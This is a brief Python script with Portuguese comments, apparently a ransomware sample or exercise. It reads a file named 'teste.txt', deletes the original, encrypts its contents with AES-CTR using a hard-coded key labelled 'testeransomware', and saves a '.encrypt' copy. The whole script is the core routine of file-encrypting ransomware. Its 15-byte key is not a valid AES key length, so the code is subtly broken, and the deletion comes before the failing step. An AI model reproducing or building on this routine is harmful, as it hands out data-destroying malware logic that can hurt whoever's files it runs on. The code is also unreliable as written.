# Importando os modulos necessarios
import os
import pyaes

# Abrir arquivo a ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
# Armazena o conteudo do arquivo em memoria
file_data = file.read()
file.close()

# Remover arquivo original
os.remove(file_name)

# Definir chave de encriptacao
key = b"testeransomware"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptogafa o arquivo
crypto_data = aes.encrypt(file_data)

# Cria o novo arquivo criptografado
new_file = file_name + '.encrypt'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
